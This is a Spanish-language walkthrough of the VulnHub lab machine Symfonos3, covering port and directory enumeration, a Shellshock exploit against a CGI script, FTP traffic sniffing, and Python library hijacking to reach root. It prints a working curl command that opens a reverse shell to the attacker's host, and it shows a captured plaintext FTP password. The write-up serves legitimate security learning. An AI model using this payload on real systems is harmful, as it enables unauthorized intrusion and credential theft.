---
layout: single
title: Symfonos3 - VulnHub
excerpt: "Symfonos3, una máquina virtual de Vulnhub, presenta una vulnerabilidad conocida como Shellshock que nos permitió obtener acceso al sistema. Para la escalada de privilegios,  iniciamos como cerberus y nos infiltramos con el usuario 'hades' al interceptar el tráfico de la máquina. Posteriormente, logramos la escalación a root aprovechando un error de permisos en una biblioteca de Python, también conocido como librari hijacking."
date: 2023-11-03
classes: wide
header:
  teaser: /assets/images/vulnhub-writeup-pinkys/logo_vulnhub.png
  teaser_home_page: true
categories:
  - vulnhub 
  - cxdxnt
tags:  
  - suid
  - rpcbind
  - mount
---
![](/assets/images/vulnhub-writeup-pinkys/logo_vulnhub.png)


Symfonos3, una máquina virtual de Vulnhub, presenta una vulnerabilidad conocida como Shellshock que nos permitió obtener acceso al sistema. Para la escalada de privilegios,  iniciamos como cerberus y nos infiltramos con el usuario 'hades' al interceptar el tráfico de la máquina. Posteriormente, logramos la escalación a root aprovechando un error de permisos en una biblioteca de Python, también conocido como librari hijacking.

## Enumeracion
Empezamos con un reconocimiento de puertos y servicios a través de la herramienta nmap. En el cual logramos detectar varios servicios.

```bash
# Nmap 7.93 scan initiated Wed Nov  1 07:09:13 2023 as: nmap -sCV -p21,22,80 -oN vulnscan.nmap 192.168.56.15
Nmap scan report for 192.168.56.15
Host is up (0.00042s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5b
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 cd64727680517ba8c7fdb266fab6980c (RSA)
|   256 74e59a5a4c1690cad8f7c778e75a8681 (ECDSA)
|_  256 3ce40bb9dbbf018ab79c42bccb1e416b (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.25 (Debian)
MAC Address: 08:00:27:1D:20:47 (Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Nov  1 07:09:20 2023 -- 1 IP address (1 host up) scanned in 7.42 seconds
```


## Analisis 

El punto de partida de la página no da ninguna información solo presenta una imagen qué debajo  del código fuente contiene un mensaje, pero  es indiferente.

![](/assets/images/vulnhub-writeup-symfonos3/symfonos3-mensaje.png)


A continuación realizaremos un ataque de Fuzzing en la parte main de la pagina.

```bash
➜  content ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.56.15/FUZZ -t 200  -c                  

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.15/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

gate                    [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 19ms]
                        [Status: 200, Size: 241, Words: 24, Lines: 23, Duration: 22ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 19ms]
```

Es recomendable incluir una barra al final durante la fase de fuzzing, ya que en ocasiones esto puede revelar directorios adicionales.

```bash
➜  content ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.56.15/FUZZ/ -t 200  -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.15/FUZZ/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

icons                   [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 17ms]
cgi-bin                 [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 19ms]
gate                    [Status: 200, Size: 202, Words: 18, Lines: 21, Duration: 10ms]
```

Procedemos a realizar fuzzing en cgi-bin

```bash
➜  content ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.56.15/cgi-bin/FUZZ -t 200  -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.15/cgi-bin/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

                        [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 26ms]
underworld              [Status: 200, Size: 63, Words: 14, Lines: 2, Duration: 290ms]
```

## Shell- cerberus

Hacktricks nos informa maneras de poder explotar un CGI-BIN el ataque es conocido como shellsocker

![](/assets/images/vulnhub-writeup-symfonos3/symfonos3-shellshock.png)

Ejercemos una reverse shell 


```bash
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.56.1/443 0>&1' http://192.168.56.15/cgi-bin/underworld
```

Una vez dentro del sistema procedo a utilizar pspy64. ¿Por qué? Básicamente procedí a realizar una enumeración manual y no logre encontrar nada, y al lanzar linpeas.sh tampoco me arrojo nada interesante.

![](/assets/images/vulnhub-writeup-symfonos3/symfonos3-trafico.png)

Observamos un proceso de autenticación en FTP en curso. Para aprovechar esta situación, podríamos emplear una herramienta para interceptar todo el tráfico y capturar las contraseñas. En este caso, estamos utilizando la interfaz 'lo'.

![](/assets/images/vulnhub-writeup-symfonos3/symfonos3-interfaces.png)

Encontramos credenciales interesantes.

![](/assets/images/vulnhub-writeup-symfonos3/symfonos3-log.png)

En la captura anterior de pspy64, observamos que el usuario root está ejecutando el script ftpclient.py, sin embargo, carecemos de permisos de escritura en dicho script.


```bash
hades@symfonos3:/opt/ftpclient$ ls -la
total 16
drwxr-x--- 2 root hades 4096 Apr  6  2020 .
drwxr-xr-x 3 root root  4096 Jul 20  2019 ..
-rw-r--r-- 1 root hades  262 Apr  6  2020 ftpclient.py
-rw-r--r-- 1 root hades  251 Nov  1 13:46 statuscheck.txt
hades@symfonos3:/opt/ftpclient$ cat ftpclient.py 
import ftplib

ftp = ftplib.FTP('127.0.0.1')
ftp.login(user='hades', passwd='PTpZTfU4vxgzvRBE')

ftp.cwd('/srv/ftp/')

def upload():
    filename = '/opt/client/statuscheck.txt'
    ftp.storbinary('STOR '+filename, open(filename, 'rb'))
    ftp.quit()

upload()
hades@symfonos3:/opt/ftpclient$ 
```

Iniciamos un análisis de permisos en la única biblioteca que el script expone.

![](/assets/images/vulnhub-writeup-symfonos3/symfonos3-libreria.png)

Después de obtener los permisos, notamos que el grupo 'gods' tiene permisos de escritura en la biblioteca. Dado que 'hades' forma parte de este grupo, procedemos a identificar la función utilizada por la biblioteca para el inicio de sesión y ejecutamos código malicioso.

![](/assets/images/vulnhub-writeup-symfonos3/symfonos3-codigo.png)


### Shell - root 

Finalmente obtuvimos root.





